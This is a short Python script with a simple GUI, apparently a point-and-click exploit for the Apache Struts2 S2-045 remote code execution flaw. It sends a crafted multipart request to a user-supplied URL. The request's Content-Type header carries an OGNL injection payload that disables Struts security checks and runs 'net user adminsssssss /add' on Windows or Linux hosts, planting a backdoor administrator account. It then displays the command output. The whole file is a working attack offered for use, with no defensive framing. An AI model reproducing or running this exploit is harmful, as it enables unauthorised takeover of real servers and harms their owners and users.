#coding:utf-8  
import urllib2  
from Tkinter import *  
import sys  
from poster.encode import multipart_encode  
from poster.streaminghttp import register_openers  
  
  
  
class START():  
  
    def __init__(self,root):  
        self.root=root  
        self.show_W_Text = Text()  
        self.show_url_ed = Label(root, text="str2")  
        self.edit_url = Entry(root, text="�����ַ")  
        self.butt_whois = Button(root, text="kill",command=self.poc)  
        self.show_url_ed.pack()  
        self.edit_url.pack()  
        self.butt_whois.pack()  
        self.show_W_Text.pack()  
  
    def poc(self):  
        w_url = self.edit_url.get()  
        text = self.show_W_Text  
        register_openers()  
        datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})  
        header[  
            "User-Agent"] = "User-Agent=Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0"  
        header[  
            "Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='net user adminsssssss /add').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        request = urllib2.Request(w_url, datagen, headers=header)  
        response = urllib2.urlopen(request).read()  
        text.insert(1.0, response)  
  
  
if __name__ == '__main__':  
  
    root=Tk()  
    root.title("str2 045")  
    motion=START(root)  
    mainloop()  